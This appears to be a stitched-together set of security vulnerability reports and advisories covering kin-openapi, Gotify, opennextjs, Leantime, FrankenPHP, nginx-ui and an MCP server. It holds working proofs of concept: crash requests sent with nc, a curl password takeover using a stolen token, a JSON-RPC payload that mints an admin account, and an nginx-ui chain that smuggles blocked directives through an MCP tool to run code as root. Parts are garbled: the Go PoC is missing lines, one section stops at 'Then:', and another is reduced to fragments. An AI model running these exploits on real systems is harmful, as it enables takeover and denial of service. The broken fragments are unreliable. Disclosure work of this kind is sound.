The defect
-------
Confirmed at HEAD (f0407d5, v0.144.0). openapi3/loader.go, inside resolveComponent's drill closure (around line 455), the case *SchemaRef branch for pathPart == "additionalProperties" dereferences c.Value.AdditionalProperties with no nil-check on c.Value:

    case *SchemaRef:
        if pathPart == "additionalProperties" {
            if ap := c.Value.AdditionalProperties.Has; ap != nil {   // c.Value can be nil here
                cursor = *ap
            } else {
                cursor = c.Value.AdditionalProperties.Schema
            }
            attempted = true
        }

When a $ref fragment drills through .../additionalProperties of a schema whose Value is still nil (a pure, not-yet-resolved $ref, or a self-reference resolved before its own Value is set), c.Value is nil and the .AdditionalProperties access panics.

Input and attacker
----------------
A tiny crafted OpenAPI document, one schema, no external refs, no network:

    openapi: 3.0.3
    info: {title: t, version: "1.0.0"}
    paths: {}
    components:
      schemas:
        A:
          $ref: '#/components/schemas/A/additionalProperties'

Attacker model: any service or tool that loads an untrusted spec via the default openapi3.Loader (LoadFromData / LoadFromFile / LoadFromURI), e.g. a spec registry, an API-management platform ingesting user specs, a linter, or a converter. It crashes during LOAD (ResolveRefsIn), before Validate.

Verification level
---------------
EXECUTED with negative controls (agent-run go test at HEAD f0407d5, including yesterday's security merge; the bug is still present). The full stack pins LoadFromData:196 -> ResolveRefsIn:274 -> resolveSchemaRef:1048 -> resolveComponent:485 -> drill:439 -> :455, propagating to main(); no recover() in loader.go/schema.go (grep + trace). Two negative controls stay clean: drilling additionalProperties of a resolved schema loads fine (the existing TestIssue376 happy path), and a normal recursive schema loads fine, so the nil Value is specifically the cause. I independently re-confirmed at HEAD that loader.go:455 dereferences c.Value.AdditionalProperties with no nil-check on c.Value. NOT verified: I did not enumerate every consumer's recover posture.

Suggested fix
----------
Add if c.Value == nil { break } (fall through to the nil-safe drillIntoField) before touching c.Value.AdditionalProperties. One line.

Also cleared (stated, not claimed)
-------------------------------
The allOf/anyOf $ref diamond does not blow up: Schema.validate threads its stack through the return and never pops it, acting as a global pointer-keyed visited-set (executed N=10..30, microseconds). External-ref SSRF/path-traversal is blocked by default (IsExternalRefsAllowed=false); the known custom-ReadFromURIFunc bypass is the already-banked downstream oasdiff item.

Advisory-source note
-----------------
Five-source enumeration: every kin-openapi advisory (CVE-2025-30153 plus the five fresh July-2026 GHSAs) is in openapi3filter (request validation); this finding is in the openapi3 loader, untouched by that systematic reporter and flagged un-analyzed by the prior oasdiff scout. Not contested on the loader surface as of today (a systematic hunter could pivot, so it decays; submit reasonably promptly).

Dedup
--
Dedup gate clean: no kin-openapi loader verdict in COVERED-INDEX, DISCLOSURE-INDEX or SCOUT-EXCLUDE (the one DISCLOSURE-INDEX hit is report #313, the downstream oasdiff, a different repo/lane).

Tooling
----
AI assistance was used while investigating. The panic is executed-verified with negative controls (a one-schema self-referential additionalProperties $ref crashes LoadFromData while a resolved additionalProperties and a normal recursive schema load fine), and I confirmed at HEAD that loader.go:455 dereferences c.Value.AdditionalProperties with no nil-check on c.Value, on a load path with no recover.

## Summary
The `openapi3filter.ValidationHandler` (the exported, documented request-validation middleware) hard-wires the legacy router (`routers/legacy`). That router matches the incoming request method verbatim against a trie built exclusively from upper-cased canonical HTTP methods. A request carrying a method token that is not one of the 9 standard methods — a legitimate-but-unsupported token such as `PROPFIND`, or a non-canonical case variant such as lowercase `get` — misses the trie, leaves `route == nil`, and for an existing **static** path falls through to `PathItem.GetOperation(method)`, whose `default:` case calls `panic(...)`. The panic fires inside route resolution, **before any authentication** runs. This is an unauthenticated, remotely triggerable denial of service (recovered per-connection panic + unbounded error-log growth).

## Root Cause
- `openapi3filter/validation_handler.go:39` — `ValidationHandler.Load()` always constructs `legacyrouter.NewRouter(doc)`; there is no alternative router option on this path.
- `routers/legacy/router.go:109` — the request method is used verbatim (`method, url := req.Method, ...`); there is no canonicalization or rejection of unknown method tokens.
- `routers/legacy/router.go:69-70` — the trie is populated with `strings.ToUpper(method)` keys taken from `pathItem.Operations()` (canonical `http.Method*` constants only).
- `routers/legacy/router.go:141` — `root.Match(method + " " + remainingPath)` misses for a non-canonical/unsupported method → `route == nil`.
- `routers/legacy/router.go:146-150` — in the `route == nil` block, `doc.Paths.Value(path)` returns non-nil for an existing static path, and control reaches `pathItem.GetOperation(method)`.
- `openapi3/path_item.go:174` — `GetOperation`'s `switch method` has no matching case → `default: panic(fmt.Errorf("unsupported HTTP method %q", method))`.

## Impact
An unauthenticated attacker sends a single request with a non-standard HTTP method token to any existing static path. The handler goroutine panics; Go's `net/http` recovers the panic per connection (process survives), aborts the connection (client sees a reset / 500), and logs a full stack trace. Repeated requests cause connection churn and unbounded `http: panic serving` log growth, and the request never reaches authentication. Availability impact (A:L) under the default synchronous `ValidationHandler` middleware; on non-net/http hosts or when reached on an application goroutine the ceiling is a full crash.

## Proof of Concept
Serve any spec with a static path (e.g. `/ping`) behind `openapi3filter.ValidationHandler`, then:
```
printf 'PROPFIND /ping HTTP/1.1\r\nHost: x\r\n\r\n' | nc target 8080   # connection aborted (panic)
printf 'get /ping HTTP/1.1\r\nHost: x\r\n\r\n'      | nc target 8080   # connection aborted (panic)
printf 'GET /ping HTTP/1.1\r\nHost: x\r\n\r\n'      | nc target 8080   # 200 OK (process survived)
```
Reproduced end-to-end against a real `net/http.Server` + `ValidationHandler`: `PROPFIND /ping` and lowercase `get /ping` both abort the connection with a panic at `path_item.go:174` (stack: `GetOperation` <- `legacy.FindRoute` router.go:150 <- `ValidationHandler.validateRequest` validation_handler.go:84); the process stays alive and subsequent `GET /ping` returns 200.

## Attack Chain
1. Entry: unauthenticated `PROPFIND /ping HTTP/1.1` (any known static path). Guard: net/http method validation. Bypass proof: net/http accepts any valid HTTP token as a method — `PROPFIND` and lowercase `get` both reach the handler.
2. Route match: `legacy/router.go:141` `root.Match("PROPFIND /ping")`. Guard: trie match. Bypass proof: trie holds only upper-cased canonical methods → miss → `route == nil`.
3. `route == nil` block: `router.go:146` `doc.Paths.Value("/ping")` → non-nil for an existing static path (exact map lookup). Guard: `pathItem == nil` check (l.147). Bypass proof: static path exists → not nil → proceeds.
4. Sink: `router.go:150` `pathItem.GetOperation("PROPFIND")` → `path_item.go:174` `default: panic(...)`.
5. Impact: handler goroutine panics; net/http recovers per connection; request never reaches auth.

## Bypass Evidence
- net/http does NOT reject non-standard method tokens — confirmed empirically: `PROPFIND` and lowercase `get` both reached the handler and panicked.
- No canonicalization/rejection exists between `FindRoute` entry and `GetOperation`; `req.Method` is used verbatim (router.go:109).
- `git show v0.144.0:openapi3/path_item.go` shows `panic(...)` at line 174; `git show v0.144.0:routers/legacy/router.go` shows verbatim method use and the unguarded `GetOperation` call. `git log v0.144.0..HEAD` on these files is empty (no post-tag fix).

## Scoping Note
The panic requires the request path to be an exact static (non-templated) key in the served spec. A concrete path against a `/{id}` template returns a clean 500 (not a panic), because `Paths.Value` is an exact map lookup. Static paths (`/health`, `/login`, `/version`, `/metrics`, `/ping`, `/`) are ubiquitous in real specs and discoverable from public specs/standard endpoints, so a vulnerable target almost always exists. This makes the finding arguably broader than existing panic advisories, as it needs no special spec construct — any static path suffices.

## Affected Versions
`<= 0.144.0` (present on the latest release tag v0.144.0; long-standing; no patched version).

## Suggested Fix
In the legacy router, canonicalize/validate the request method before route resolution and return `ErrMethodNotAllowed`/`ErrPathNotFound` for unknown methods, or make `PathItem.GetOperation` return an error (nil) for unrecognized methods instead of calling `panic`.

The password change endpoint (`POST /current/user/password`) in Gotify versions <= 2.9.1 does not require knowledge of the current password. An attacker in possession of a valid client token can set a new password for the affected user. Recovering the account requires administrator intervention or direct database access.

## PoC

```bash
# Attacker has obtained a client token
# No prior password knowledge required
STOLEN_TOKEN="Cxxxxxxxxxx"

curl -X POST "http://gotify-host/current/user/password?token=${STOLEN_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"pass":"attacker_controls_this"}'
# Expected response:
# HTTP/1.1 200 OK
```

## Mitigation

- Upgrade to Gotify 3.0.0, which introduces step-up authentication: changing the  password now requires re-authenticating with the account password, or
- Restrict access to the state-changing endpoints under `/user` and  `/current/user` to trusted networks.

## Summary

When cache interception is enabled, `@opennextjs/cloudflare` can interpret percent-encoded paths differently during middleware matching and cache lookup.

An encoded request may fail to match authorization middleware, then be decoded into the cache key of a protected route. The cached response may consequently be returned without invoking the middleware.

`enableCacheInterception` is disabled by default.

## Impact

A remote unauthenticated attacker may retrieve cached content from routes intended to be protected by middleware.

An application is affected when it:

- explicitly enables `enableCacheInterception`;
- relies on middleware for access control; and
- has a matching cached route.

## Details

Middleware matching previously used the encoded request pathname, while cache interception decoded the pathname before selecting a cache entry.

For example, consider an application with:

- middleware matcher `/admin/:path*`;
- middleware returning `401 Authentication required` for `/admin`;
- a statically generated, cached `/admin` route; and
- cache interception enabled:

```ts
export default defineCloudflareConfig({
  incrementalCache: staticAssetsIncrementalCache,
  enableCacheInterception: true,
});
```

An attacker can request:

```http
GET /%61dmin
```

The encoded pathname does not match `/admin/:path*`, so the authorization middleware is not invoked. Cache interception then decodes `%61dmin` to `admin` and may return the cached `/admin` response:

```http
HTTP/1.1 200 OK
x-opennext-cache: HIT

Protected content
```

Malformed paths exposed an additional inconsistency. For example:

```http
GET /%61dmin/%ZZ
```

The previous implementation decoded each segment independently. It decoded `%61dmin` to `admin` but retained the malformed `%ZZ` segment, allowing cache lookup to continue using a partially decoded pathname.

## Patches

The fix aligns encoded-path handling across middleware matching and cache lookup, and rejects malformed paths instead of partially decoding them. See the upstream fixes in [opennextjs-aws#1199](https://github.com/opennextjs/opennextjs-aws/pull/1199) and [opennextjs-aws#1200](https://github.com/opennextjs/opennextjs-aws/pull/1200).

Users should upgrade to `@opennextjs/cloudflare@1.20.2` or later.

## Workarounds

If upgrading is not immediately possible for an application:

1. Disable cache interception by removing `enableCacheInterception: true`.
2. Enforce authorization inside protected route handlers rather than relying exclusively on middleware.
3. Reject encoded paths for protected routes at a trusted proxy before they reach the Worker.

Adding individual encoded matcher variants is not a complete workaround because pathnames can have multiple equivalent encodings.

### Summary

A nil-pointer dereference in `openapi3filter` lets any unauthenticated client crash a request handler with a single HTTP request against an OpenAPI **3.1** operation that declares `type: array` **without** `items`. OpenAPI 3.1 (JSON Schema 2020-12) permits omitting `items`, and `doc.Validate()` accepts such schemas with `Schema.Items == nil`. Request/response decoders then dereference `Items` with no nil check. The panic is **deterministic (100%)** on every request to the affected operation. There is no `recover()` in `openapi3filter`; under handlers without per-request recover the process can exit.

### Details

**Spec-validation asymmetry.** OpenAPI 3.0 rejects array schemas that omit `items` ([`openapi3/schema.go`](https://github.com/getkin/kin-openapi/blob/master/openapi3/schema.go) around the `TypeArray` / `newSchemaItemsRequired` branch). For OpenAPI 3.1, `T.Validate` enables `jsonSchema2020ValidationEnabled`, so that check is skipped and `Schema.Items` remains nil after a clean `doc.Validate()`.

**Vulnerable decoder.** The primary request-side crash is in [`UrlencodedBodyDecoder`](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go) (still present on this checkout at L1421):

```go
case propType.Is("array"):
    items := propSchema.Value.Items.Value  // Items == nil → panic
```

This runs during schema inspection **before** form values are parsed. Any non-empty `application/x-www-form-urlencoded` body for the operation reaches the dereference (an empty body is rejected earlier when `requestBody.required` is true, and never enters the decoder).

The same nil `Items` also crashes:

| Path | Location | Trigger |
|---|---|---|
| `MultipartBodyDecoder` | `req_resp_decoder.go` ~1564 → 1579 | `multipart/form-data` part named like the array property |
| `parseArray` → `parsePrimitive` | `req_resp_decoder.go` ~1129 / 1151 | Array-typed **response headers** via `ValidateResponse`, and path/cookie array params |

`Middleware` / `ValidationHandler` call `ValidateRequest` / `ValidateResponse` directly with no recover, so the panic escapes the library into the application.

**Recommended fix.** Guard nil `Items` and return a structured decode/validation error, e.g.:

```diff
 case propType.Is("array"):
+	if propSchema.Value.Items == nil || propSchema.Value.Items.Value == nil {
+		return nil, fmt.Errorf("unsupported schema of request body's property %q: array items required for decoding", propName)
+	}
 	items := propSchema.Value.Items.Value
```

Apply equivalent guards in `MultipartBodyDecoder` and `parseArray` before calling `parsePrimitive`.

### PoC

Verified against revision `c11a4812ba7be3ee3d81453be0c397ee84c238d5`, Go 1.25, `darwin/arm64`.

**1. Spec** — OpenAPI 3.1 operation with urlencoded body and `type: array` property without `items`:

```yaml
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /f:
    post:
      requestBody:
        required: true
        content:
          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
```

**2. E2E program** — `net/http` server using the same public entrypoint (`gorillamux` → `openapi3filter.ValidateRequest`) real middleware uses. Save as `main.go` in a module that depends on `github.com/getkin/kin-openapi` at a vulnerable revision, then `go run .`:

```go
	"fmt"
	"log"
	"net/http"
	"strings"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"

const spec = `

info: {title: t, version: 1.0.0}
paths:
  /f:
    post:
      requestBody:
        required: true

          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
`

func main() {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(spec))
	if err != nil {
		log.Fatal(err)
	}
	if err := doc.Validate(loader.Context); err != nil {
		log.Fatalf("doc.Validate rejected (unexpected for 3.1): %v", err)
	}
	fmt.Println("SPEC_ACCEPTED; Items ==", doc.Paths.Value("/f").Post.RequestBody.Value.
		Content.Get("application/x-www-form-urlencoded").Schema.Value.Properties["tags"].Value.Items)

	router, err := gorillamux.NewRouter(doc)
	if err != nil {
		log.Fatal(err)
	}

	req, _ := http.NewRequest(http.MethodPost, "/f", strings.NewReader("tags=a"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	route, pp, _ := router.FindRoute(req)

		defer func() {
			if r := recover(); r != nil {
				fmt.Printf("DIRECT_PANIC: %v\n", r)
			}
		}()
		_ = openapi3filter.ValidateRequest(loader.Context, &openapi3filter.RequestValidationInput{
			Request: req, PathParams: pp, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
		fmt.Println("DIRECT_PANIC: none (unexpected)")
	}()

	mux := http.NewServeMux()
	mux.HandleFunc("/f", func(w http.ResponseWriter, r *http.Request) {
		route, pathParams, err := router.FindRoute(r)
		if err != nil {

		}
		err = openapi3filter.ValidateRequest(r.Context(), &openapi3filter.RequestValidationInput{
			Request: r, PathParams: pathParams, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok\n"))
	})

	addr := "127.0.0.1:8085"

	fmt.Println("attack: curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'tags=a' http://" + addr + "/f")
```

**3. Observed output** (`go run .`):

```
SPEC_ACCEPTED; Items == <nil>
DIRECT_PANIC: runtime error: invalid memory address or nil pointer dereference
listening on http://127.0.0.1:8085/f
```

Then:


### Impact

- **Type:** NULL Pointer Dereference → **unauthenticated remote denial of service**.
- **Who is impacted:** applications using `github.com/getkin/kin-openapi/openapi3filter` to validate requests/responses against OpenAPI **3.1** documents that contain an `items`-less `type: array` in a urlencoded or multipart body property, or an array-typed response header (or other `parseArray` surfaces). Specs may be author mistakes, codegen output, or attacker-supplied where untrusted documents are loaded — `doc.Validate()` does **not** reject them under 3.1.
- **Attack:** a single unauthenticated POST (or response-validation hit) with a tiny non-empty body.
- **Consequence:** deterministic panic on every request to the operation. With stock `net/http`, the server logs `http: panic serving` and aborts the connection; without per-request recover (common outside pure `net/http` handlers), the process can crash.
- **Not affected:** OpenAPI 3.0 documents (spec validation rejects missing `items`); JSON request bodies (different decoder path that does not hit this `Items.Value` inspection).

### Summary

Any authenticated Leantime user - including the lowest-privilege `readonly` role - can escalate to full administrative access by calling the JSON-RPC method `leantime.rpc.api.api.createApiKeyWithProjects` with an attacker-chosen `role` value. The server creates a new account at that role with no authorization check, and the resulting credentials work as a fully interactive admin login through the ordinary web UI. The same root cause (missing per-method authorization on JSON-RPC-exposed service methods) also leaves the `Plugins` service's `installPlugin`, `enablePlugin`, `disablePlugin`, and `removePlugin` methods callable by any authenticated user with no role check, even though their web-UI equivalents correctly require an admin/owner role.

### Details

Leantime's JSON-RPC API (`app/Domain/Api/Controllers/Jsonrpc.php`) reflects any public method on any `@api`-annotated service class and dispatches it at `leantime.rpc.{domain}.{service}.{method}`. Per-method authorization is enforced by `PermissionEnforcer::enforce()` (`app/Core/Auth/Permissions/PermissionEnforcer.php`), which reads a `#[RequiresPermission(...)]` PHP attribute off the target method - but when that attribute is **absent**, `enforce()` silently returns and allows the call through.

`Api::createApiKeyWithProjects(array $values, ?array $projects)` (`app/Domain/Api/Services/Api.php`) is `@api`-exposed and carries no `#[RequiresPermission]` attribute. It forwards `$values` - including a caller-supplied `role` - directly into `createAPIKey()` → `Users\Repositories\Users::addUser()`, with no server-side clamping of `role` against the calling user's own privilege level:

```php
// app/Domain/Api/Services/Api.php
/**
 * @api
 */
public function createApiKeyWithProjects(array $values, ?array $projects): array|false
{
    $apiKeyValues = $this->createAPIKey($values);   // no #[RequiresPermission], no role check
    ...
}
```

The equivalent web route (`NewApiKey` controller) correctly gates account creation behind an admin-only role check (`Auth::authOrRedirect([Roles::$admin, ...])`), but that gate is bypassed entirely by calling the service directly through JSON-RPC.

Separately, `Plugins::installPlugin()`, `enablePlugin()`, `disablePlugin()`, and `removePlugin()` (`app/Domain/Plugins/Services/Plugins.php`, lines ~266/299/320/342) share the same gap: all four are `@api`-exposed with no `#[RequiresPermission]`, while their web-controller equivalents (`Myapps.php`, `Details.php`) correctly require `Roles::$owner`/`Roles::$admin`.

Authenticating to the JSON-RPC endpoint with an ordinary browser session cookie (rather than a dedicated API key) is sufficient, provided the request carries an `X-Requested-With: XMLHttpRequest` header (`app/Core/Middleware/StartSession.php`) - this is exactly what the application's own first-party JS client already sends, so no special tooling beyond a normal authenticated session is needed.

### PoC

A runnable Python PoC (`requests` library only) reproduces this end-to-end; see the attached `poc.py`. Steps:

1. Create/authenticate as a `readonly`-role account (the lowest privilege level). Confirm it is correctly blocked (HTTP 403) from an admin-only page, e.g. `/plugins/myapps`.
2. From that same low-privilege session, send:
   ```
   POST /api/jsonrpc
   Content-Type: application/json
   X-Requested-With: XMLHttpRequest

   {"jsonrpc":"2.0","id":1,"method":"leantime.rpc.api.api.createApiKeyWithProjects",
    "params":{"values":{"firstname":"poc","role":40,"status":"a"},"projects":[]}}
   ```
   The server responds `HTTP 200` with the newly created account's `user`/`passwordClean` and `"role":40` (admin) in the JSON body.
3. Log in through the normal `/auth/login` form using the returned `user`/`passwordClean`. The resulting session now has full, interactive access to `/plugins/myapps` (HTTP 200) - the exact page that returned 403 in step 1.

Reproduced against a local instance built from this repository's own `.dev` Docker tooling (`.dev/docker-compose.yaml`), with dependencies installed via `composer install` / `npx mix` and no modifications to application code.

### Impact

Complete compromise of any Leantime instance by an attacker who controls, or can register/be granted, any authenticated account - including the lowest-privilege `readonly` role. No admin credentials, tokens, or prior access beyond an ordinary low-privilege login are required. This is a full authenticated-to-admin privilege escalation (CWE-862 Missing Authorization, CWE-269 Improper Privilege Management). Combined with the plugin-management gap described above, it further extends to arbitrary plugin install/enable/disable/remove, a path toward code-execution-level impact tracked from the same root cause.

## Summary
In worker mode under concurrency, FrankenPHP can hand a PHP session id from one request to another when PHP's `session` extension is loaded as a shared module instead of being statically linked into the FrankenPHP binary. A request presenting `Cookie: session=A` can have `session_id()` resolve to `B` (a different concurrent client's id) or to a stale id from a previous request served by the same worker thread.

## Impact
- **Security:** cross-user session exposure / session hijacking in worker mode. Same impact class as CVE-2026-24894.
- **Functional:** users are intermittently logged out; their cookie's session is ignored and they receive a foreign or empty session.

## Affected / not affected
Exposure is determined by how the `session` extension is linked in the PHP build FrankenPHP is compiled against, **not** by the FrankenPHP release:

- **Affected:** any build where the `session` extension is not visible to FrankenPHP at compile time, i.e. loaded as a shared / out-of-tree module (`extension=session` in an ini). This includes the RPM and Debian packages and other packaged `php-zts` distributions that ship `session` as a shared extension under `conf.d`.
- **Not affected:** builds where `session` is statically compiled into the PHP that FrankenPHP links against, such as the official static binaries and Docker images. There, the reset code below is compiled in and clears the id every request.

The C session-reset code is unchanged across 1.11.x-1.12.x, so this is not a code regression between releases. A "1.12.2 works / 1.12.3 leaks" observation on the same host reflects two differently-built packages, not a source change. The persistent-zval helpers (#2366) are compiled only under `FRANKENPHP_TEST` and are unrelated.

## Root cause
FrankenPHP resets per-request session state in `frankenphp_reset_session_state()`, which releases `PS(id)` so the next `session_start()` re-reads the request cookie. That whole function is guarded by `#ifdef HAVE_PHP_SESSION`, a macro defined only when the session extension headers are present at FrankenPHP compile time (session statically enabled in the PHP build). When `session` is a shared module, `HAVE_PHP_SESSION` is undefined, the reset is compiled out, and `PS(id)` survives the request boundary.

PHP's `session_start()` reads the request cookie only when `PS(id)` is `NULL` (`ext/session/session.c`, `try_find_session_id_in_cookies()`: `if (!PS(use_cookies) || PS(id)) return;`). With a stale `PS(id)`, the cookie is ignored and the worker reuses the previous request's id, exposing it to whichever client is served next.

## Reproduction
Minimal worker script (`index.php`):
```php
<?php
$handler = static function () {
    session_start();
    $sent = $_COOKIE['session'] ?? '(none)';
    $id   = session_id();
    header('Content-Type: text/plain');
    echo ($sent === '(none)' || $sent === $id) ? "OK   sent=$sent id=$id\n"
                                               : "LEAK sent=$sent id=$id\n";
    session_write_close();
};
while (\frankenphp_handle_request($handler)) {}
```
Run under worker mode with `num 2` (≥2 workers), `session.use_strict_mode=1`, on a PHP build where `session` is a shared module. Pre-create two valid sessions `A` and `B`, then fire concurrent requests alternating the two cookies:
```sh
seq 600 | xargs -P32 -I{} sh -c '
  c=$([ $(( {} % 2 )) -eq 0 ] && echo A || echo B);
  curl -s -H "Cookie: session=$c" http://127.0.0.1:8080/' | grep -c LEAK
```
On an affected build a large fraction of responses are `LEAK` (`session_id()` differs from the cookie sent, and `A` and `B` sometimes resolve to the same id). On a statically-linked build the count is always `0`.

## Fix
When `HAVE_PHP_SESSION` is undefined, FrankenPHP now resets the `session` module through the module registry on every worker request (its `RSHUTDOWN` releases `PS(id)`, `RINIT` re-initialises the globals), so the per-request cleanup always runs regardless of how the extension is linked. Statically-linked builds are unchanged and keep using `frankenphp_reset_session_state()`.

Verified on PHP 8.6-dev ZTS, 2 workers, `session.use_strict_mode=1`, 600 alternating-cookie concurrent requests: before the fix 519/600 leaked; after the fix 0/600. Statically-linked builds stayed at 0/600.

## Workarounds
- Use a FrankenPHP build with `session` statically compiled (official static binaries or Docker images).
- Or, in the worker loop, after `session_write_close()` call `session_id('')` so the next `session_start()` re-reads the request cookie (with `session.use_strict_mode=1`).

### Summary
Standalone short tokens issued for WebSocket and explicit-token authentication can survive administrative revocation in cache. If the same account is later re-enabled before the cache entry expires, the deleted short token becomes valid again.

### Details

This leaves standalone short-token cache entries behind. `GetTokenUserByShortToken()` checks that cache first and then loads the user by ID, so the stale short token becomes usable again if the account status is restored to `true`.

- [internal/user/user.go](/home/kali/Desktop/bounty/nginx-ui/internal/user/user.go:43)
- [internal/user/user.go](/home/kali/Desktop/bounty/nginx-ui/internal/user/user.go:118)

## Summary
`config.ValidateConfigFile` is the security control that blocks dangerous nginx directives
(`js_*`, `perl_*`, `load_module` of njs/perl modules, `user root`). Its directive scanner is
bypassable: it splits the config by newlines and inspects only the FIRST token of each line, but
nginx separates directives with `;`, not newlines. Putting a benign directive first and the blocked
directive after a `;` on the SAME line defeats every check. The `include` directive is also not on
the denylist. As a result, an authenticated caller can inject the exact directives the hardening was
meant to block, through EVERY path that calls the validator — `POST /api/configs` (add), the REST
config modify endpoint (api/config/modify.go), the MCP `nginx_config_modify` tool, and the
site/stream save paths (internal/site/save.go, internal/stream/save.go). On deployments where
nginx has the njs/perl module (the official uozi/nginx-ui Docker image ships ngx_http_js_module.so),
this leads to code execution in the nginx worker; with `user root` the workers run as root.

This is distinct from the config_add gap (the MCP nginx_config_add tool not calling the validator at
all): here the validator IS called and still bypassed, so fixing config_add does not fix this.

## Root cause (internal/config/validation.go, ValidateConfigDirectives)
```go
for _, line := range bytes.Split(content, []byte("\n")) {          // splits on \n only
    trimmed := strings.TrimSpace(string(line))
    ...
    directive := firstDirectiveToken(trimmed)                      // first [a-zA-Z_]* of the line
    if directive == "user" && configuresRootWorkers(trimmed) { ... }     // keyed on first token
    if directive == "load_module" && loadsRestrictedDynamicModule(...) { ... } // keyed on first token
    if _, blocked := blockedConfigDirectives[directive]; blocked { ... }      // keyed on first token
}
```
nginx parses `a 1; b 2;` on one line as two directives, but this scanner only ever sees `a`.
`include` is absent from `blockedConfigDirectives`.

## Proof of Concept (live, official image uozi/nginx-ui:2.3.11) — VALIDATED paths only
Authenticated with a node secret (`X-Node-Secret`, from nginx-ui's first-boot log) or a user JWT.
Every step below hits a path that calls ValidateConfigFile.

1) Baseline — validator works on a plain line:
```
curl -X POST http://HOST/api/configs -H "X-Node-Secret: $S" -H 'Content-Type: application/json' \
  -d '{"name":"x.conf","base_dir":"","content":"js_import a.js;","overwrite":true}'
# -> 40017 "file content contains restricted nginx directive: js_import"   (REJECTED)
```

2) Create the njs module file via the VALIDATED REST add (JS source is not nginx directives, so it
   passes ValidateConfigContent):
```
poc.conf:
  import fs from 'fs';
  function pwn(r){ fs.writeFileSync('/tmp/NJS_VIA_DENYLIST_BYPASS.txt','denylist-bypass-rce-ok\n'); r.return(200,'pwned2\n'); }
  export default { pwn };
curl -X POST http://HOST/api/configs -H "X-Node-Secret: $S" -H 'Content-Type: application/json' \
  -d '{"name":"poc.conf","base_dir":"","content":"<the JS above>","overwrite":true}'   # ACCEPTED
```

3) Overwrite the main nginx.conf via the VALIDATED `nginx_config_modify` MCP tool, smuggling each
   blocked directive after a benign one on the SAME line (this is ACCEPTED by ValidateConfigFile):
```nginx
worker_processes 1; load_module /usr/lib/nginx/modules/ngx_http_js_module.so;
error_log /var/log/nginx/error.log notice; user root;
pid /run/nginx.pid;
events { worker_connections 1024; }
http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream; js_import poc from /etc/nginx/poc.conf;
    server { listen 8897; location = /pwn3 { js_content poc.pwn; } }
}
```

4) Reload. Result:
- `nginx -t` successful.
- worker `/proc/<pid>/status` → `Uid: 0 0 0 0` (root) — the blocked `user root` took effect.
- `GET http://127.0.0.1:8897/pwn3` → `pwned2` — js_content executed.
- `/tmp/NJS_VIA_DENYLIST_BYPASS.txt` created, owned by root → njs code execution as root.

(An MCP-over-SSE client for steps using nginx_config_modify is included in the config_add report as
`poc_mcp_client.py`; the same client drives this PoC. `X-Node-Secret` authenticates both REST and MCP.)

## Impact
Authenticated config-injection that defeats the directive-validation control on all guarded write
paths. On deployments with njs/perl available (the official Docker image ships ngx_http_js_module.so):
code execution in the nginx worker and, via `user root`, arbitrary file read/write as root (trivially
escalated to full host compromise). On stock nginx without those modules: reliable DoS (failed
reload) plus `user root` privilege regression.

## Honest scope / caveats
- Authenticated (node secret or user JWT), agent-mediated — not unauthenticated.
- What was live-verified: the bypass + full RCE on `POST /api/configs` (add) and the MCP
  `nginx_config_modify` tool. The other callers — REST config modify (api/config/modify.go), site
  save (internal/site/save.go), stream save (internal/stream/save.go) — invoke the SAME
  `ValidateConfigFile` (code-confirmed), so they are affected by construction; I did not individually
  live-test each.
- RCE is conditional on the njs/perl module being present; it ships in the official image, so the
  default Docker deployment is exploitable. On stock nginx without those modules the injected
  `load_module`/`js_*` make reload fail → DoS plus a `user root` privilege regression (inferred from
  nginx module behavior; not separately tested on a stock build).
- The `;` and `include` bypasses are fully confirmed live. A backslash line-continuation variant was
  accepted by the validator but its nginx parsing was not separately confirmed and is not relied on.
- "Full host compromise" describes the capability of root file read/write via njs `fs` (proven: a
  root-owned file was written); the subsequent authorized_keys/cron step is a well-known escalation,
  not something this PoC executed.

## Suggested fix
Do not hand-roll a newline/first-token denylist. Validate the way nginx parses: split statements on
`;` (and handle blocks, comments, line continuations), validate EVERY statement, block/limit
`include`, and recurse into included files — or validate via an allowlist and/or by running
`nginx -t` on the candidate before activating it.

## Dedup / novelty
Distinct from CVE-2026-33032 (unauthenticated MCP endpoint — an auth issue, now fixed) and from the
separately reported config_add validation gap (a missing validator call on one path). This is a
bypass of the validator itself, affecting every path that calls it; no existing CVE/GHSA covers it
(checked osv.dev and the GitHub advisory database for this repo). Appears novel.

### Summary
In affected versions, a Streamable HTTP server in stateful mode (the default) never reclaimed session state:

- sessions did not expire;
- a client `DELETE` ended the session but left its entry registered;
- a session whose first request was refused stayed registered with a running task.

Each session also kept its parsed `initialize` parameters, and the number of sessions was unlimited. A client that could reach the endpoint could grow server memory without bound using ordinary short requests; only a restart reclaimed it.

### Am I affected?
Yes, if you serve MCP over Streamable HTTP in stateful mode and clients you do not fully trust can reach the endpoint. Stateful mode is the default for:

- `FastMCP` (1.x)
- `MCPServer` and `Server.streamable_http_app()` (2.x)
- `StreamableHTTPSessionManager`

Affected versions: 1.8.0 through 1.29.1, and 2.0.0 through 2.1.1.

Not affected:

- servers on 1.12.0 or later passing `stateless_http=True` (no sessions are kept)
- servers using only the stdio or SSE transports

Authentication limits who can open sessions, not how many a token holder can open.

### Fix
Upgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later. In those versions:

- a session with no request in flight for `session_idle_timeout` seconds (default 1800) is closed and its ID then answers `404`; open streams and in-progress requests keep it alive;
- at most `max_sessions` sessions exist at once (default 10000); a request that would open another is answered `503`;
- a session is discarded as soon as it ends, whether by `DELETE`, expiry, or a refused opening request.

